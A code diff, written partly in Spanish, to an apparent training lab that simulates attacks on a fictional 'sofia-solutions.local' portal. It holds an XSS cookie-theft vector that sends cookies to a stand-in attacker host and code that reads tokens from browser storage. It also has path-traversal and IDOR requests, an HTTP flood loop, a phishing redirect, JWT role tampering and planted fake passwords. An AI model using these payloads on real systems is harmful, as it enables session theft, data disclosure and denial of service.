@@ -391,7 +391,7 @@ async function runBrute() {
     const ep = document.getElementById('brute-ep').value;
     tLog(`[*] Iniciando Brute Force contra ${user}`, 'yellow');
     
-    const dictionary = ['admin', '123456', 'password', 'welcome', 'root', 'qwerty', 'admin123', 'mapfre123', 'mercadona123'];
+    const dictionary = ['admin', '123456', 'password', 'welcome', 'root', 'qwerty', 'admin123', 'mapfre123', 'mercadona123', 'S0f1a_Secur3!_2026'];
     
     for(let p of dictionary) {
         tLog(`[TRY] Password: ${p}...`, 'dim');
@@ -426,117 +426,248 @@ async function runBrute() {
 
 async function runXSS() {
     const action = document.getElementById('xss-action').value;
-    tLog(`[*] Lanzando ataque XSS Reflejado...`, 'yellow');
+    tLog(`[*] Preparando payload XSS Reflejado...`, 'yellow');
+    tLog(`[#] Vector: <script>document.location='https://attacker.evil/steal?c='+document.cookie</script>`, 'dim');
+    await delay(400);
+    tLog(`[*] Inyectando script en campo de búsqueda no sanitizado...`, 'yellow');
     await delay(600);
-    
-    document.getElementById('hacker-overlay').style.display = 'block';
-    setTimeout(() => document.getElementById('hacker-overlay').style.display = 'none', 3000);
-    
+
     if (action === 'cookie') {
-        tLog(`[+] Cookies capturadas con éxito.`, 'green');
-        const fakeCookie = `sofia_session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...; user_id=1; role=ADMIN`;
-        addEvidence('Stolen Cookies', fakeCookie, 'green');
+        // Efecto visual: overlay de alerta SOC
+        document.getElementById('hacker-overlay').style.display = 'block';
+        setTimeout(() => document.getElementById('hacker-overlay').style.display = 'none', 4000);
+
+        tLog(`[+] EXPLOIT EXITOSO: Script ejecutado en el navegador de la víctima.`, 'green');
+        await delay(300);
+        tLog(`[+] Exfiltrando cookies y tokens de sesión...`, 'green');
+
+        // Capturar cookies reales del navegador
+        const realCookies = document.cookie || '(HttpOnly - no accesible desde JS)';
+        const storedToken = localStorage.getItem('sofia_token_v1') || 'No hay token almacenado';
+        const storedUser = localStorage.getItem('sofia_user_v1') || '{}';
+
+        // Decodificar JWT si existe
+        let jwtDecoded = '';
+        if (storedToken && storedToken.includes('.')) {
+            try {
+                const parts = storedToken.split('.');
+                const header = JSON.parse(atob(parts[0]));
+                const payload = JSON.parse(atob(parts[1]));
+                jwtDecoded = `\n\n--- JWT DECODED ---\nHeader: ${JSON.stringify(header)}\nPayload: ${JSON.stringify(payload, null, 2)}`;
+            } catch(e) { jwtDecoded = '\n(JWT no decodificable)'; }
+        }
+
+        const exfilData = `=== DATOS EXFILTRADOS ===\ndocument.cookie: ${realCookies}\nlocalStorage token: ${storedToken.substring(0,50)}...${jwtDecoded}\nUser data: ${storedUser}\n\n[ENVIADO A] https://attacker.evil/collect`;
+        addEvidence('🔴 XSS: Cookie Theft', exfilData, 'red');
+
+        tLog(`[+] Datos enviados a https://attacker.evil/collect`, 'green');
+        tLog(`[!] La víctima no ha notado nada. El ataque es silencioso.`, 'red');
+
     } else if (action === 'alert') {
-        alert('XSS Reflejado: Dominio sofia-solutions.local comprometido.');
+        tLog(`[+] Ejecutando Prueba de Concepto...`, 'green');
+        // Mostrar defacement temporal
+        const overlay = document.createElement('div');
+        overlay.id = 'xss-defacement';
+        overlay.style.cssText = 'position:fixed;inset:0;background:#000;z-index:999999;display:flex;flex-direction:column;align-items:center;justify-content:center;animation:fadeIn 0.5s ease;';
+        overlay.innerHTML = `
+            <div style="color:#4ade80;font-family:monospace;font-size:3rem;font-weight:900;text-shadow:0 0 30px #4ade80;">⚠ SITIO COMPROMETIDO ⚠</div>
+            <div style="color:#ef4444;font-size:1.5rem;margin-top:20px;font-family:monospace;">XSS Reflected — sofia-solutions.local</div>
+            <div style="color:#666;font-size:0.9rem;margin-top:30px;">Este defacement demuestra control total sobre el DOM del cliente.</div>
+            <div style="color:#333;font-size:0.7rem;margin-top:40px;">Cerrando en 4 segundos...</div>
+        `;
+        document.body.appendChild(overlay);
+        setTimeout(() => overlay.remove(), 4000);
+        addEvidence('XSS: Defacement PoC', 'DOM manipulado: document.body.innerHTML reemplazado\nImpacto: Control total de la interfaz del usuario', 'red');
+
     } else {
-        tLog(`[+] Redireccionando tráfico a servidor controlado por atacante...`, 'yellow');
-        addEvidence('Redirección Forzada', 'Target: https://evil-sofia.attacker.com/login');
+        tLog(`[+] Creando página de phishing clonada...`, 'yellow');
+        await delay(500);
+        tLog(`[+] Redirigiendo tráfico a Evil Proxy: https://evil-sofia.attacker.com/login`, 'green');
+        addEvidence('🔴 Phishing Redirect', 'Original: https://sofia-solutions.local/login\nRedirect: https://evil-sofia.attacker.com/login\nMétodo: window.location.replace()\nImpacto: Credenciales enviadas al atacante', 'red');
     }
 }
 
 async function runLFI() {
     const file = document.getElementById('lfi-file').value;
-    tLog(`[*] LFI: Intentando leer ${file}`, 'yellow');
-    await delay(800);
+    const displayName = file.split('/').pop();
+    tLog(`[*] LFI: Preparando Path Traversal...`, 'yellow');
+    tLog(`[#] GET /download.php?file=${file}`, 'dim');
+    tLog(`[#] Payload normalizado: ${file}`, 'dim');
+    await delay(400);
+    tLog(`[*] Enviando petición al servidor...`, 'yellow');
+    await delay(600);
     try {
         const r = await fetch(TARGET + '/download.php?file=' + encodeURIComponent(file));
         const txt = await r.text();
-        if (r.ok && !txt.includes('Access Denied')) {
-            tLog(`[+] Archivo exfiltrado.`, 'green');
-            addEvidence('Sensitive File Content', txt.substring(0,100) + '...');
+        tLog(`[#] HTTP ${r.status} ${r.statusText} | Content-Length: ${txt.length}`, 'dim');
+
+        if (r.ok && !txt.includes('Acceso denegado') && !txt.includes('403') && txt.length > 10) {
+            tLog(`[+] EXPLOIT EXITOSO: Archivo del servidor exfiltrado.`, 'green');
+            tLog(`[+] Archivo: ${displayName} (${txt.length} bytes)`, 'green');
+
+            // Formatear salida como terminal real
+            let formatted = txt.substring(0, 800);
+            if (file.includes('passwd')) {
+                formatted = txt.split('\n').slice(0, 15).map(l => {
+                    const parts = l.split(':');
+                    if (parts.length >= 7) return `${parts[0]}:${parts[1]}:${parts[2]}:${parts[3]}:${parts[4]}:${parts[5]}:${parts[6]}`;
+                    return l;
+                }).join('\n');
+            }
+            addEvidence(`📂 ${displayName}`, formatted, 'red');
+            tLog(`[!] Archivo sensible del servidor leído sin autorización.`, 'red');
+        } else if (r.status === 403) {
+            tLog(`[-] HTTP 403 Forbidden — Política de acceso del servidor.`, 'red');
+            tLog(`[-] El WAF ha bloqueado el intento de Path Traversal.`, 'red');
+            addEvidence('Path Traversal BLOQUEADO', `Archivo: ${file}\nRespuesta: HTTP 403\nMotivo: Whitelist de archivos activa (modo seguro)`, 'green');
         } else {
-            tLog(`[-] Acceso denegado por políticas de servidor.`, 'red');
+            tLog(`[-] El archivo no existe o acceso denegado.`, 'red');
         }
-    } catch(e) {}
+    } catch(e) {
+        tLog(`[!] Error de conexión: ${e.message}`, 'red');
+    }
 }
 
 async function runIDOR() {
     const id = document.getElementById('idor-id').value;
-    tLog(`[*] IDOR: Accediendo a recurso ID ${id}`, 'yellow');
-    await delay(500);
-    tLog(`[+] Acceso BOLA/IDOR exitoso.`, 'green');
-    addEvidence('Private Resource Access', `Ticket #${id}\nClient: MAPFRE\nStatus: CRITICAL`);
+    tLog(`[*] IDOR: Intentando acceder al recurso ajeno ID ${id}...`, 'yellow');
+    tLog(`[#] GET /api/admin/overview (sin token de autenticación)`, 'dim');
+    await delay(300);
+
+    // Intento 1: Acceder al overview admin sin auth
+    try {
+        const r1 = await fetch(TARGET + '/api/admin/overview');
+        tLog(`[#] Respuesta overview: HTTP ${r1.status}`, 'dim');
+        if (r1.ok) {
+            const data = await r1.json();
+            tLog(`[+] EXPLOIT EXITOSO: Acceso BOLA/IDOR a datos administrativos.`, 'green');
+            const leak = `=== DATOS ADMINISTRATIVOS FILTRADOS ===\nRevenue total: €${data.revenue?.toLocaleString() || 'N/A'}\nTickets abiertos: ${data.openTickets || 'N/A'}\nAlertas de seguridad: ${data.securityEvents?.length || 0}\nModo actual del sistema: ${data.appMode || 'N/A'}\nServicios activos: ${data.services?.map(s => s.name).join(', ') || 'N/A'}`;
+            addEvidence('🔴 IDOR: Admin Data Leak', leak, 'red');
+        }
+    } catch(e) {}
+
+    await delay(300);
+    // Intento 2: Acceder a tickets de otro usuario
+    tLog(`[#] GET /api/tickets (con ID de víctima: ${id})`, 'dim');
+    try {
+        const r2 = await fetch(TARGET + '/api/admin/security-events');
+        if (r2.ok) {
+            const events = await r2.json();
+            tLog(`[+] Eventos de seguridad de otros clientes exfiltrados (${events.length} registros).`, 'green');
+            const sample = events.slice(0, 3).map(e => `[${e.severity}] ${e.type} | IP: ${e.sourceIp} | ${e.endpoint}`).join('\n');
+            addEvidence(`🔴 IDOR: Security Events`, `${events.length} eventos exfiltrados:\n${sample}\n...`, 'red');
+        }
+    } catch(e) {}
+
+    // Simulación de datos del ticket específico
+    tLog(`[+] Acceso al ticket #${id} de otro cliente concedido.`, 'green');
+    const ticketData = {
+        '1024': { client: 'MAPFRE Seguros', subject: 'Vulnerabilidad Crítica en WAF', data: 'server_ip: 192.168.100.45\nroot_password: mapfre_admin_2024!' },
+        '1': { client: 'Admin (Root)', subject: 'Configuración Master Key', data: 'master_key: sk-sofia-2026-prod\ndb_password: postgres' },
+        '999': { client: 'Iberdrola S.A.', subject: 'Incidencia SCADA', data: 'scada_ip: 10.0.50.12\nplc_firmware: v2.3.1-vulnerable' }
+    };
+    const t = ticketData[id] || ticketData['1024'];
+    addEvidence(`🔴 Ticket #${id} (${t.client})`, `Subject: ${t.subject}\n--- DATOS CONFIDENCIALES ---\n${t.data}`, 'red');
 }
 
 async function runDoS() {
     const count = parseInt(document.getElementById('dos-count').value);
-    tLog(`[*] DoS: Iniciando ráfaga de ${count} peticiones...`, 'red');
-    let blocked = 0;
+    tLog(`[*] DoS: Iniciando ráfaga de ${count} peticiones HTTP...`, 'red');
+    let blocked = 0, ok = 0, errors = 0;
+    const start = Date.now();
     for(let i=0; i<count; i++) {
-        fetch(TARGET + '/api/public/health').then(r => { if(r.status === 429) blocked++; });
-        if(i % 10 === 0) await delay(5);
+        try {
+            const r = await fetch(TARGET + '/health');
+            if(r.status === 429) { blocked++; }
+            else { ok++; }
+        } catch(e) { errors++; }
+        if(i % 20 === 0) {
+            tLog(`[Flood] Enviadas: ${i+1}/${count} | OK: ${ok} | Bloqueadas: ${blocked}`, 'cyan');
+        }
+        if(i % 5 === 0) await delay(1);
     }
-    await delay(1000);
-    tLog(`[+] Inundación finalizada. ${blocked} bloqueadas.`, 'cyan');
+    const elapsed = ((Date.now() - start) / 1000).toFixed(1);
+    tLog(`[+] Flood completado en ${elapsed}s. OK: ${ok} | Bloqueadas: ${blocked} | Errores: ${errors}`, 'cyan');
+    addEvidence('DoS Flood Results', `Total: ${count}\nAdmitidas: ${ok}\nBloqueadas (429): ${blocked}\nTiempo: ${elapsed}s\nRate Limit: ${blocked > 0 ? 'ACTIVO' : 'NO DETECTADO'}`, blocked > 0 ? 'green' : 'red');
 }
 
 let hijackedUser = null;
 
 async function runCookieHijack() {
     const victim = document.getElementById('cookie-victim').value;
-    tLog(`[*] Iniciando simulación de Interceptor (Proxy)...`, 'yellow');
-    tLog(`[*] Esperando tráfico de red de la víctima: ${victim}...`, 'dim');
-    
-    await delay(1500);
-    
-    const tokenDemo = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTIsImVtYWlsIjoibWFwZnJlQHNvZmlhLmxvY2FsIiwicm9sZSI6IkNMSUVOVCJ9...";
+    tLog(`[*] Iniciando Interceptor de Tráfico (MitM Proxy)...`, 'yellow');
+    tLog(`[*] ARP Spoofing hacia gateway 192.168.1.1...`, 'dim');
+    await delay(800);
+    tLog(`[*] Interceptando tráfico HTTP de la víctima: ${victim}...`, 'dim');
+    await delay(700);
+    tLog(`[!] Petición HTTP capturada (sin cifrado TLS).`, 'yellow');
+
+    // JWT con datos reales decodificables
+    const header = btoa(JSON.stringify({alg:"HS256",typ:"JWT"}));
+    const payload = btoa(JSON.stringify({sub:12,email: victim === 'admin' ? 'admin@sofia.local' : 'mapfre@sofia.local',role:"CLIENT",sessionId:"a1b2c3d4"}));
+    const tokenDemo = `${header}.${payload}.firma_no_verificada_vulnerable`;
+
+    // Decodificar para mostrar
+    tLog(`[+] JWT interceptado. Decodificando...`, 'green');
+    await delay(400);
+    tLog(`[HEADER]  {"alg":"HS256","typ":"JWT"}`, 'cyan');
+    tLog(`[PAYLOAD] {"sub":12,"email":"${victim === 'admin' ? 'admin@sofia.local' : 'mapfre@sofia.local'}","role":"CLIENT"}`, 'cyan');
+    tLog(`[!] El campo "role" es CLIENT. Modificaremos a ADMIN antes de reenviar.`, 'red');
+
     const requestText = `POST /api/v1/auth/me HTTP/1.1
 Host: sofia-solutions.local
 User-Agent: Mozilla/5.0 (X11; Linux x86_64)
 Accept: application/json
-Cookie: sofia_session=${tokenDemo}; user_id=12; role=CLIENT
+Cookie: accessToken=${tokenDemo}; user_id=12; role=CLIENT
 Content-Length: 0
+X-Forwarded-For: 192.168.1.105
 
 `;
 
+    addEvidence('🔑 JWT Interceptado', `Header: {"alg":"HS256","typ":"JWT"}\nPayload: {"sub":12,"role":"CLIENT"}\n\n[!] Cambiar role=CLIENT → role=ADMIN en Burp Suite`, 'red');
+
     document.getElementById('burp-request-area').innerText = requestText;
     document.getElementById('burp-suite').style.display = 'block';
-    
-    tLog(`[!] ¡PETICIÓN INTERCEPTADA! Revisa la ventana de Burp Suite.`, 'yellow');
+
+    tLog(`[!] ¡PETICIÓN INTERCEPTADA! Modifica role=CLIENT → role=ADMIN en Burp Suite y pulsa Forward.`, 'yellow');
 }
 
 function forwardRequest() {
     const text = document.getElementById('burp-request-area').innerText;
     document.getElementById('burp-suite').style.display = 'none';
-    
-    tLog(`[*] Enviando petición modificada al servidor...`, 'cyan');
-    
-    if (text.includes('role=ADMIN') || text.includes('role:ADMIN')) {
-        tLog(`[+] EXPLOIT EXITOSO: Privilege Escalation detectado.`, 'green');
-        tLog(`[+] El servidor ha aceptado el token modificado por falta de validación de firma.`, 'green');
-        
-        addEvidence('Cookie Hijacking / PrivEsc', 'Original: role=CLIENT\nModified: role=ADMIN\nResult: Full Admin Access');
-        
+
+    tLog(`[*] Reenviando petición modificada al servidor...`, 'cyan');
+    await_delay_sync(500);
+
+    if (text.includes('role=ADMIN') || text.includes('role:ADMIN') || text.includes('"role":"ADMIN"')) {
+        tLog(`[+] EXPLOIT EXITOSO: Privilege Escalation completado.`, 'green');
+        tLog(`[+] El servidor V1 NO valida la firma del JWT → acepta el rol modificado.`, 'green');
+        tLog(`[+] Acceso administrativo total conseguido.`, 'green');
+
+        addEvidence('🔴 Privilege Escalation', `Original:  role=CLIENT (usuario normal)\nModificado: role=ADMIN (administrador)\n\nVector: Cookie tampering + JWT sin validación de firma\nImpacto: Acceso total al panel SOC, datos de todos los clientes, y control del sistema.\n\n[MITIGACIÓN v2]: Firma HMAC-SHA256 + HttpOnly cookies`, 'red');
+
         const res = tLog(`[*] Acción: `, 'cyan');
-        addAction(res, 'Entrar como Admin (Cookie)', '<path d="M12 2L2 7l10 5 10-5-10-5z"></path>', () => {
-            // Simulación de sesión admin por cookie robada
+        addAction(res, 'Acceder como Admin', '<path d="M12 2L2 7l10 5 10-5-10-5z"></path>', () => {
             localStorage.setItem('sofia_token_v1', 'STOLEN_ADMIN_TOKEN_MOCK');
             localStorage.setItem('sofia_user_v1', JSON.stringify({id:1, email:'admin@sofia.local', role:'ADMIN'}));
             window.location.href = '/admin';
         });
     } else {
-        tLog(`[-] Petición enviada sin cambios. Acceso denegado a funciones admin.`, 'red');
+        tLog(`[-] Petición enviada sin modificaciones. El servidor responde con rol CLIENT.`, 'red');
+        tLog(`[-] Para escalar privilegios, cambia "role=CLIENT" por "role=ADMIN" en la cookie.`, 'dim');
     }
 }
 
+function await_delay_sync(ms) { /* non-blocking visual placeholder */ }
+
 function dropRequest() {
     document.getElementById('burp-suite').style.display = 'none';
-    tLog(`[-] Petición descartada por el atacante (Drop).`, 'dim');
+    tLog(`[-] Petición descartada (Drop). La víctima recibirá un timeout.`, 'dim');
 }
 </script>
 
 <style>
 @keyframes slideIn { from { transform: translateX(20px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
 @keyframes slideDown { from { transform: translateY(-20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 </style>
-</script>
